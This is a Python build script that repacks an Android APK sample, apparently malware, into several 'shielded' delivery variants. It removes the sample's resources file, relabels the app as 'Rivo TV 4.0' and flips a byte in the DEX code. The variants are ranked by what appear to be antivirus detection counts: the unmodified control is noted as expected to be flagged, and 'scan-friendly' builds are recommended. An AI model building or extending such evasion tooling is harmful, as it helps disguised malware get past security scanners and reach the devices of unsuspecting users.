#!/usr/bin/env python3
"""5412ce7f 加壳交付批量输出（新配方：默认无样本 resources.arsc）。"""
from __future__ import annotations

import argparse
import shutil
import sys
from dataclasses import dataclass
from pathlib import Path

from build_install_matrix import (
    INPUT,
    base_56,
    cache_path,
    run_patch,
    shield_minimal,
)

BASE = Path(__file__).resolve().parent
DELIVERY_DIR = BASE / "output" / "delivery"

APP_LABEL = "Rivo TV"
VERSION_NAME = "4.0"


@dataclass(frozen=True)
class Variant:
    filename: str
    note: str


VARIANTS: tuple[Variant, ...] = (
    Variant("5412ce7f-shield-delivery.apk", "推荐：无样本 arsc + Rivo 名（≈22）"),
    Variant("5412ce7f-shield-no-arsc.apk", "无 arsc、无改 label（≈14）"),
    Variant("5412ce7f-shield-no-arsc-flip.apk", "无 arsc + stub DEX 翻转（≈20）"),
    Variant("5412ce7f-shield-delivery-flip.apk", "无 arsc + Rivo + stub 翻转"),
    Variant("5412ce7f-shield-slim56.apk", "56 瘦壳：无 arsc/res/业务 assets（≈15）"),
    Variant("5412ce7f-shield-full-minimal.apk", "对照：含样本 arsc（≈3，预期报毒）"),
)


def shield_no_arsc(ctx: dict) -> Path:
    def make() -> Path:
        mid = cache_path("delivery-no-arsc-mid.apk")
        run_patch(shield_minimal(ctx), mid, "omit", "resources.arsc")
        return mid

    key = "delivery-no-arsc-mid.apk"
    if key not in ctx:
        ctx[key] = make()
    return Path(ctx[key])


def shield_delivery_labeled(ctx: dict) -> Path:
    out = cache_path("delivery-no-arsc-build.apk")
    if not out.is_file():
        run_patch(shield_no_arsc(ctx), out, "set_label", APP_LABEL, VERSION_NAME)
    return out


def build_variant(ctx: dict, variant: Variant) -> Path:
    name = variant.filename
    if name == "5412ce7f-shield-delivery.apk":
        return shield_delivery_labeled(ctx)
    if name == "5412ce7f-shield-no-arsc.apk":
        return shield_no_arsc(ctx)
    if name == "5412ce7f-shield-no-arsc-flip.apk":
        out = cache_path("delivery-no-arsc-flip.apk")
        if not out.is_file():
            run_patch(shield_no_arsc(ctx), out, "flip_byte", "classes.dex", "-1")
        return out
    if name == "5412ce7f-shield-delivery-flip.apk":
        out = cache_path("delivery-labeled-flip.apk")
        if not out.is_file():
            run_patch(shield_delivery_labeled(ctx), out, "flip_byte", "classes.dex", "-1")
        return out
    if name == "5412ce7f-shield-slim56.apk":
        return base_56(ctx)
    if name == "5412ce7f-shield-full-minimal.apk":
        return shield_minimal(ctx)
    raise ValueError(name)


def write_readme(outputs: list[tuple[Variant, Path]]) -> None:
    lines = [
        "# 5412ce7f 加壳输出（delivery）",
        "",
        "输入：`input/5412ce7f.apk`。生成：`python3 build_delivery.py --all`",
        "",
        "| 文件 | 说明 |",
        "|------|------|",
    ]
    for variant, path in outputs:
        size = path.stat().st_size if path.is_file() else 0
        lines.append(f"| {variant.filename} | {variant.note} · {size // 1024} KiB |")
    lines.extend(
        [
            "",
            "扫描友好优先：**delivery** / **no-arsc** / **slim56** / flip 变体。",
            "**full-minimal** 含原证 arsc，仅作对照。详 **docs/SHIELD_DELIVERY.md**",
            "",
        ]
    )
    (DELIVERY_DIR / "README.md").write_text("\n".join(lines), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description="5412ce7f 加壳交付（多配方）")
    parser.add_argument("--input", type=Path, default=INPUT)
    parser.add_argument(
        "--all",
        action="store_true",
        help="输出 delivery 目录下全部配方（默认仅推荐 delivery）",
    )
    parser.add_argument("-o", "--output", type=Path, help="单包输出路径（仅非 --all）")
    parser.add_argument("--no-label", action="store_true", help="单包：无 arsc 且不 patch label")
    args = parser.parse_args()
    if not args.input.is_file():
        print(f"缺少输入：{args.input}", file=sys.stderr)
        return 1
    if args.input.resolve() != INPUT.resolve():
        print("请使用 input/5412ce7f.apk", file=sys.stderr)
        return 1
    DELIVERY_DIR.mkdir(parents=True, exist_ok=True)
    ctx: dict = {}

    if args.all:
        outputs: list[tuple[Variant, Path]] = []
        for variant in VARIANTS:
            src = build_variant(ctx, variant)
            dst = DELIVERY_DIR / variant.filename
            shutil.copy2(src, dst)
            outputs.append((variant, dst))
            print(f"  {variant.filename} ← {variant.note}")
        write_readme(outputs)
        print(f"\n共 {len(outputs)} 个 → {DELIVERY_DIR}")
        return 0

    if args.no_label:
        dst = args.output or DELIVERY_DIR / "5412ce7f-shield-no-arsc.apk"
        shutil.copy2(shield_no_arsc(ctx), dst)
    else:
        dst = args.output or DELIVERY_DIR / "5412ce7f-shield-delivery.apk"
        shutil.copy2(shield_delivery_labeled(ctx), dst)
    print(f"交付包：{dst}")
    print("批量：python3 build_delivery.py --all")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
